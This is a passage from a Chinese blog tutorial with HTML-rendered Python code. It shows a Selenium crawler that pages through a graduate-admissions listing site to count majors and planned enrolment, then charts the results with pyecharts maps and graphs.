\</span><br><span class="line">                              <span class="string">"div.main-wrapper:nth-child(2) "</span> \</span><br><span class="line">                              <span class="string">"div.container.clearfix:nth-child(5) "</span> \</span><br><span class="line">                              <span class="string">"div.zsml-row.clearfix "</span> \</span><br><span class="line">                              <span class="string">"div.zsml-page-box ul.ch-page "</span></span><br><span class="line">        <span class="keyword">if</span>(pagenumber == <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 不用下一页操作</span></span><br><span class="line">            major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">            print(<span class="string">"这一页的专业数量"</span> + str(len(major)))</span><br><span class="line">            majors += len(major)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(major) + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    number = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[7]//a[1]"</span>.format(i)).get_attribute(<span class="string">"data-title"</span>)</span><br><span class="line">                    numbers = re.sub(<span class="string">r"[^0-9]"</span>, <span class="string">""</span>, number)</span><br><span class="line">                    all_number += int(numbers)</span><br><span class="line">                    print(<span class="string">"  拟招生："</span> + numbers)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    print(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span>(pagenumber &lt; <span class="number">7</span> ):</span><br><span class="line">            <span class="comment"># 找到下一页按钮</span></span><br><span class="line">            <span class="keyword">while</span>(pagenumber):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                    print(<span class="string">"这一页的专业数量"</span> + str(len(major)))</span><br><span class="line">                    majors += len(major)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(major) + <span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            number = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[7]//a[1]"</span>.format(i)).get_attribute(</span><br><span class="line">                                <span class="string">"data-title"</span>)</span><br><span class="line">                            numbers = re.sub(<span class="string">r"[^0-9]"</span>, <span class="string">""</span>, number)</span><br><span class="line">                            print(<span class="string">"  拟招生："</span> + numbers)</span><br><span class="line">                            all_number += int(numbers)</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            print(e)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        print(e)</span><br><span class="line">                ul = driver.find_element_by_css_selector(css_selector_jumpto)</span><br><span class="line">                li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">                li[<span class="number">-1</span>].click()</span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 下一页按钮位置不同,用 Go</span></span><br><span class="line">            flag = <span class="number">2</span>  <span class="comment"># 下一次要Go的页码</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(pagenumber):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                    print(<span class="string">"这一页的专业数量"</span> + str(len(major)))</span><br><span class="line">                    majors += len(major)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    print(e)</span><br><span class="line">                driver.find_element_by_css_selector(<span class="string">"#goPageNo"</span>).send_keys(str(flag))  <span class="comment"># 输入页码跳转</span></span><br><span class="line">                driver.find_element_by_xpath(<span class="string">"//input[@class='page-btn']"</span>).click()  <span class="comment"># 点击 Go，仍然同是一个 window_handle</span></span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line">                flag +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(len(major_list))</span></span><br><span class="line">        print(<span class="string">"专业数量： "</span> + str(majors))</span><br><span class="line">        print(<span class="string">"  共招生: "</span> + str(all_number))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> majors, all_number</span><br></pre></td></tr></table></figure></li></ol><ol start="6"><li><p>保存数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保存数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span><span class="params">(data_list)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"../major_info.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> data_list:</span><br><span class="line">            f.write(line + <span class="string">"\r"</span>)</span><br></pre></td></tr></table></figure></li><li><p>关闭浏览器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">driver.close()</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure></li></ol><h3 id="数据可视化分析"><a href="#数据可视化分析" class="headerlink" title="数据可视化分析"></a>数据可视化分析</h3><p>数据可视化我们选择 <a href="http://pyecharts.org/#/zh-cn/intro" target="_blank" rel="noopener">pyecharts</a> ,原因在于它的高度抽象，极大的简化了我们对数据进行可视化的操作难度。</p><p>该项目中我们主要在三处使用了可视化相关操作，分别是：</p><ol><li>对相关高校在各省分布的全国地图绘制</li><li>对选择城市开设目标专业的高校招生情况的折线图绘制</li><li>对目标高校开设目标专业的招生情况柱状图绘制</li></ol><p>数据可视化的关键在于 <strong>数据的格式化</strong> ，剔除无关数据，保证完整的数据关系</p><p>以绘制全国地图为例，在得到各个包含各个省市名称的列表之后，需要对这些名称进行格式化处理，只保留主要关键字：北京市-&gt;北京、新疆维吾尔族自治区 -&gt; 新疆、黑龙江省 -&gt; 黑龙江 等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">realcity = []</span><br><span class="line">            <span class="comment"># 处理城市名，只保留两字或三字名称</span></span><br><span class="line">            <span class="keyword">for</span> citys <span class="keyword">in</span> city_name:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"黑龙江"</span> <span class="keyword">in</span> citys:</span><br><span class="line">                    a = <span class="string">"黑龙江"</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"内蒙古"</span> <span class="keyword">in</span> citys:</span><br><span class="line">                    a = <span class="string">"内蒙古"</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    a = citys[<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line">                realcity.append(a)</span><br><span class="line">            <span class="comment"># print(realcity)</span></span><br><span class="line">            <span class="comment"># 将数据处理成列表</span></span><br><span class="line">            list1 = [[realcity[i], school_counts[i]] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(realcity))]</span><br></pre></td></tr></table></figure><p>再将城市名称列表与数量列表合并之后，即可绘制地图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">map_1 = Map()</span><br><span class="line">            map_1.set_global_opts(</span><br><span class="line">                title_opts=opts.TitleOpts(title=<span class="string">"2020高校分布"</span>),</span><br><span class="line">                visualmap_opts=opts.VisualMapOpts(max_=<span class="number">40</span>)  <span class="comment"># 最大数据范围</span></span><br><span class="line">            )</span><br><span class="line">            map_1.add(<span class="string">"2020高校分布"</span>, list1, maptype=<span class="string">"china"</span>)</span><br><span class="line">            map_1.render(<span class="string">'SchoolMap.html'</span>)</span><br></pre></td></tr></table></figure><p>其他两个例子同理</p><h2 id="功能划分"><a href="#功能划分" class="headerlink" title="功能划分"></a>功能划分</h2><p>有了可视化之后，我们就可以尝试将代码功能划分的更细致。主要实现三个功能：</p><ol><li>根据输入的门类类别代码，学科类别代码来绘制符合条件的高校在全国各省的分布情况</li><li>根据输入的省份、门类类别代码、学科类别代码来绘制符合条件的高校对应专业的拟招生人数等信息</li><li>根据输入的高校名称、学科类别代码来绘制该高校开设的专业数量和对应的拟招生人数</li></ol><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><p>将功能抽象为三个类，分别为：<code>SchoolMap</code> 、 <code>ReserachDirections</code> 、 <code>RDsBySchoolName</code> </p><p><code>SchoolMap</code> 负责实现功能一，主要代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 返回当前所选择城市开设目标专业的高校数量</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">count_city</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        pagenumber = self.paging(driver)</span><br><span class="line">        counts = <span class="number">0</span></span><br><span class="line">        self.FlagOfProcess = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pagenumber == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 不用下一页操作</span></span><br><span class="line">                numbers = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                counts = len(numbers)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.FlagOfProcess = <span class="literal">False</span></span><br><span class="line">                print(<span class="string">"查找失败，请检查当前页面是否为空！"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> (pagenumber &lt; <span class="number">7</span>):</span><br><span class="line">            <span class="comment"># 找到下一页按钮</span></span><br><span class="line">            <span class="keyword">while</span> (pagenumber):</span><br><span class="line">                numbers = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                counts += len(numbers)</span><br><span class="line">                ul = driver.find_element_by_xpath(<span class="string">"//ul[@class='ch-page']"</span>)</span><br><span class="line">                li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">                li[<span class="number">-1</span>].click()</span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 下一页按钮位置不同,用 Go</span></span><br><span class="line">            flag = <span class="number">2</span>  <span class="comment"># 下一次要Go的页码</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (pagenumber):</span><br><span class="line">                numbers = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                <span class="comment"># 定位页码</span></span><br><span class="line">                counts += len(numbers)</span><br><span class="line">                driver.find_element_by_css_selector(<span class="string">"#goPageNo"</span>).send_keys(str(flag))  <span class="comment"># 输入页码跳转</span></span><br><span class="line">                driver.find_element_by_xpath(<span class="string">"//input[@class='page-btn']"</span>).click()  <span class="comment"># 点击 Go，仍然同是一个 window_handle</span></span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> counts</span><br></pre></td></tr></table></figure><p><code>ReserachDirections</code> 主要实现功能二，主要代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获得某个院校在目标专业下的研究方向的数量，返回数量列表</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_major_info</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        <span class="comment"># 当前 Tab 里有多少个页面</span></span><br><span class="line">        pagenumber = self.paging(driver)</span><br><span class="line">        majors = <span class="number">0</span></span><br><span class="line">        all_number = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 定位跳转</span></span><br><span class="line">        css_selector_jumpto = <span class="string">"body.ch-sticky:nth-child(2) "</span> \</span><br><span class="line">                              <span class="string">"div.main-wrapper:nth-child(2) "</span> \</span><br><span class="line">                              <span class="string">"div.container.clearfix:nth-child(5) "</span> \</span><br><span class="line">                              <span class="string">"div.zsml-row.clearfix "</span> \</span><br><span class="line">                              <span class="string">"div.zsml-page-box ul.ch-page "</span></span><br><span class="line">        <span class="keyword">if</span>(pagenumber == <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 不用下一页操作</span></span><br><span class="line">            major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">            print(<span class="string">"这一页的专业数量"</span> + str(len(major)))</span><br><span class="line">            majors += len(major)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(major) + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    number = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[7]//a[1]"</span>.format(i)).get_attribute(<span class="string">"data-title"</span>)</span><br><span class="line">                    numbers = re.sub(<span class="string">r"[^0-9]"</span>, <span class="string">""</span>, number)</span><br><span class="line">                    all_number += int(numbers)</span><br><span class="line">                    print(<span class="string">"  拟招生："</span> + numbers)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    print(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span>(pagenumber &lt; <span class="number">7</span> ):</span><br><span class="line">            <span class="comment"># 找到下一页按钮</span></span><br><span class="line">            <span class="keyword">while</span>(pagenumber):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                    print(<span class="string">"这一页的专业数量"</span> + str(len(major)))</span><br><span class="line">                    majors += len(major)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(major) + <span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            number = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[7]//a[1]"</span>.format(i)).get_attribute(</span><br><span class="line">                                <span class="string">"data-title"</span>)</span><br><span class="line">                            numbers = re.sub(<span class="string">r"[^0-9]"</span>, <span class="string">""</span>, number)</span><br><span class="line">                            print(<span class="string">"  拟招生："</span> + numbers)</span><br><span class="line">                            all_number += int(numbers)</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            print(e)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        print(e)</span><br><span class="line">                ul = driver.find_element_by_css_selector(css_selector_jumpto)</span><br><span class="line">                li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">                li[<span class="number">-1</span>].click()</span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 下一页按钮位置不同,用 Go</span></span><br><span class="line">            flag = <span class="number">2</span>  <span class="comment"># 下一次要Go的页码</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(pagenumber):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                    print(<span class="string">"这一页的专业数量"</span> + str(len(major)))</span><br><span class="line">                    majors += len(major)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    print(e)</span><br><span class="line">                driver.find_element_by_css_selector(<span class="string">"#goPageNo"</span>).send_keys(str(flag))  <span class="comment"># 输入页码跳转</span></span><br><span class="line">                driver.find_element_by_xpath(<span class="string">"//input[@class='page-btn']"</span>).click()  <span class="comment"># 点击 Go，仍然同是一个 window_handle</span></span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line">                flag +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(len(major_list))</span></span><br><span class="line">        print(<span class="string">"专业数量： "</span> + str(majors))</span><br><span class="line">        print(<span class="string">"  共招生: "</span> + str(all_number))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> majors, all_number</span><br></pre></td></tr></table></figure><p><code>RDsBySchoolName</code> 主要负责功能三，主要代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_major_list</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        major_number_list = []</span><br><span class="line">        admission_list = []</span><br><span class="line">        label_list = []</span><br><span class="line">        value_list = []</span><br><span class="line"></span><br><span class="line">        ul = driver.find_element_by_xpath(<span class="string">"//ul[@class='zsml-zy-filter']"</span>)</span><br><span class="line">        li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">        print(<span class="string">"当前院校专业数量："</span> + str(len(li)))</span><br><span class="line"></span><br><span class="line">        input_selector = <span class="string">"/html[1]/body[1]/div[2]/div[3]/div[1]/div[2]/div[2]/form[1]/ul[1]/li[&#123;&#125;]/input[1]"</span></span><br><span class="line">        label_selector = <span class="string">"/html[1]/body[1]/div[2]/div[3]/div[1]/div[2]/div[2]/form[1]/ul[1]/li[&#123;&#125;]/label[1]"</span></span><br><span class="line">        <span class="keyword">for</span> check_box <span class="keyword">in</span> range(<span class="number">1</span>, len(li)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                value = driver.find_element_by_xpath(input_selector.format(check_box)).get_attribute(<span class="string">"value"</span>)</span><br><span class="line">                label = driver.find_element_by_xpath(label_selector.format(check_box)).get_attribute(<span class="string">"textContent"</span>)</span><br><span class="line">                driver.find_element_by_xpath(input_selector.format(check_box)).click()</span><br><span class="line">                driver.find_element_by_xpath(<span class="string">"//input[@class='blue-btn-s']"</span>).click()</span><br><span class="line">                label_list.append(label)</span><br><span class="line">                value_list.append(value)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 得到每个专业下的研究方向数量与拟招生人数</span></span><br><span class="line">                majors, all_number = self.get_major_info(driver)</span><br><span class="line">                major_number_list.append(majors)</span><br><span class="line">                admission_list.append(all_number)</span><br><span class="line"></span><br><span class="line">                print(<span class="string">" 当前专业："</span> + label)</span><br><span class="line">                print(<span class="string">" 研究方向数量： "</span> + str(majors), <span class="string">"拟招生人数： "</span> + str(all_number))</span><br><span class="line">                <span class="comment"># 两次点击取消选择</span></span><br><span class="line">                driver.find_element_by_xpath(input_selector.format(check_box)).click()</span><br><span class="line">                driver.find_element_by_xpath(<span class="string">"//input[@class='blue-btn-s']"</span>).click()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line">        print(value_list, label_list)</span><br><span class="line">        print(major_number_list, admission_list)</span><br><span class="line">        <span class="keyword">return</span> label_list, major_number_list, admission_list</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 得到研究方向数量与拟招生人数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_major_info</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        <span class="comment"># 当前 Tab 里有多少个页面</span></span><br><span class="line">        pagenumber = self.paging(driver)</span><br><span class="line">        majors = <span class="number">0</span></span><br><span class="line">        all_number = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 定位跳转</span></span><br><span class="line">        css_selector_jumpto = <span class="string">"body.ch-sticky:nth-child(2) "</span> \</span><br><span class="line">                              <span class="string">"div.main-wrapper:nth-child(2) "</span> \</span><br><span class="line">                              <span class="string">"div.container.clearfix:nth-child(5) "</span> \</span><br><span class="line">                              <span class="string">"div.zsml-row.clearfix "</span> \</span><br><span class="line">                              <span class="string">"div.zsml-page-box ul.ch-page "</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pagenumber == <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 不用下一页操作</span></span><br><span class="line">            major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">            majors += len(major)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(major) + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    number = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[7]//a[1]"</span>.format(i)).get_attribute(<span class="string">"data-title"</span>)</span><br><span class="line">                    numbers = re.sub(<span class="string">r"[^0-9]"</span>, <span class="string">""</span>, number)</span><br><span class="line">                    all_number += int(numbers)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    print(e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 找到下一页按钮</span></span><br><span class="line">            <span class="keyword">while</span> (pagenumber):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                    <span class="comment"># print("这一页的研究方向数量" + str(len(major)))</span></span><br><span class="line">                    majors += len(major)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(major) + <span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            number = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[7]//a[1]"</span>.format(i)).get_attribute(</span><br><span class="line">                                <span class="string">"data-title"</span>)</span><br><span class="line">                            numbers = re.sub(<span class="string">r"[^0-9]"</span>, <span class="string">""</span>, number)</span><br><span class="line">                            <span class="comment"># print("  拟招生：" + numbers)</span></span><br><span class="line">                            all_number += int(numbers)</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            print(e)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    print(e)</span><br><span class="line">                ul = driver.find_element_by_css_selector(css_selector_jumpto)</span><br><span class="line">                li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">                li[<span class="number">-1</span>].click()</span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> majors, all_number</span><br></pre></td></tr></table></figure><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p><strong>CSCrawler.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 